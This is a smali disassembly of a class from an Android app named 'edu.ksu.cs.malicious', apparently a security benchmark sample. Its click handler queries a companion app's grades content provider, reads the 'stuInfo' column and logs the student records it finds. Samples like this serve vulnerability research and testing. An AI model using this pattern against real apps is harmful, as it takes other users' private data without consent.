.class Ledu/ksu/cs/malicious/MainActivity$2;
.super Ljava/lang/Object;
.source "MainActivity.java"

# interfaces
.implements Landroid/view/View$OnClickListener;


# annotations
.annotation system Ldalvik/annotation/EnclosingMethod;
    value = Ledu/ksu/cs/malicious/MainActivity;->onResume()V
.end annotation

.annotation system Ldalvik/annotation/InnerClass;
    accessFlags = 0x0
    name = null
.end annotation


# instance fields
.field final synthetic this$0:Ledu/ksu/cs/malicious/MainActivity;

.field final synthetic val$result:Landroid/widget/EditText;


# direct methods
.method constructor <init>(Ledu/ksu/cs/malicious/MainActivity;Landroid/widget/EditText;)V
    .locals 0
    .param p1, "this$0"    # Ledu/ksu/cs/malicious/MainActivity;

    .line 57
    iput-object p1, p0, Ledu/ksu/cs/malicious/MainActivity$2;->this$0:Ledu/ksu/cs/malicious/MainActivity;

    iput-object p2, p0, Ledu/ksu/cs/malicious/MainActivity$2;->val$result:Landroid/widget/EditText;

    invoke-direct {p0}, Ljava/lang/Object;-><init>()V

    return-void
.end method


# virtual methods
.method public onClick(Landroid/view/View;)V
    .locals 10
    .param p1, "v"    # Landroid/view/View;

    .line 60
    const/4 v0, 0x0

    .line 61
    .local v0, "set":Ljava/util/Set;, "Ljava/util/Set<Ljava/lang/String;>;"
    new-instance v1, Landroid/net/Uri$Builder;

    invoke-direct {v1}, Landroid/net/Uri$Builder;-><init>()V

    .line 62
    .local v1, "uriBuilder":Landroid/net/Uri$Builder;
    const-string v2, "edu.ksu.cs.benign.grades"

    invoke-virtual {v1, v2}, Landroid/net/Uri$Builder;->authority(Ljava/lang/String;)Landroid/net/Uri$Builder;

    .line 63
    const-string v2, "content"

    invoke-virtual {v1, v2}, Landroid/net/Uri$Builder;->scheme(Ljava/lang/String;)Landroid/net/Uri$Builder;

    .line 64
    iget-object v2, p0, Ledu/ksu/cs/malicious/MainActivity$2;->this$0:Ledu/ksu/cs/malicious/MainActivity;

    invoke-virtual {v2}, Ledu/ksu/cs/malicious/MainActivity;->getContentResolver()Landroid/content/ContentResolver;

    move-result-object v3

    invoke-virtual {v1}, Landroid/net/Uri$Builder;->build()Landroid/net/Uri;

    move-result-object v4

    const/4 v5, 0x0

    const/4 v6, 0x0

    const/4 v7, 0x0

    const/4 v8, 0x0

    const/4 v9, 0x0

    invoke-virtual/range {v3 .. v9}, Landroid/content/ContentResolver;->query(Landroid/net/Uri;[Ljava/lang/String;Ljava/lang/String;[Ljava/lang/String;Ljava/lang/String;Landroid/os/CancellationSignal;)Landroid/database/Cursor;

    move-result-object v2

    .line 65
    .local v2, "mCursor":Landroid/database/Cursor;
    if-eqz v2, :cond_1

    invoke-interface {v2}, Landroid/database/Cursor;->getCount()I

    move-result v3

    if-lez v3, :cond_1

    .line 66
    new-instance v3, Ljava/util/HashSet;

    invoke-direct {v3}, Ljava/util/HashSet;-><init>()V

    move-object v0, v3

    .line 67
    :goto_0
    invoke-interface {v2}, Landroid/database/Cursor;->moveToNext()Z

    move-result v3

    if-eqz v3, :cond_1

    .line 68
    const-string v3, "stuInfo"

    invoke-interface {v2, v3}, Landroid/database/Cursor;->getColumnIndex(Ljava/lang/String;)I

    move-result v3

    invoke-interface {v2, v3}, Landroid/database/Cursor;->getString(I)Ljava/lang/String;

    move-result-object v3

    .line 69
    .local v3, "entry":Ljava/lang/String;
    invoke-static {}, Ledu/ksu/cs/malicious/MainActivity;->access$000()Ljava/lang/String;

    move-result-object v4

    invoke-static {v4, v3}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I

    .line 70
    invoke-interface {v0, v3}, Ljava/util/Set;->add(Ljava/lang/Object;)Z

    move-result v4

    if-nez v4, :cond_0

    .line 71
    iget-object v4, p0, Ledu/ksu/cs/malicious/MainActivity$2;->val$result:Landroid/widget/EditText;

    const-string v5, "Congratulations! Your guessed the right grade"

    invoke-virtual {v4, v5}, Landroid/widget/EditText;->setText(Ljava/lang/CharSequence;)V

    .line 73
    .end local v3    # "entry":Ljava/lang/String;
    :cond_0
    goto :goto_0

    .line 75
    :cond_1
    invoke-interface {v2}, Landroid/database/Cursor;->close()V

    .line 76
    return-void
.end method
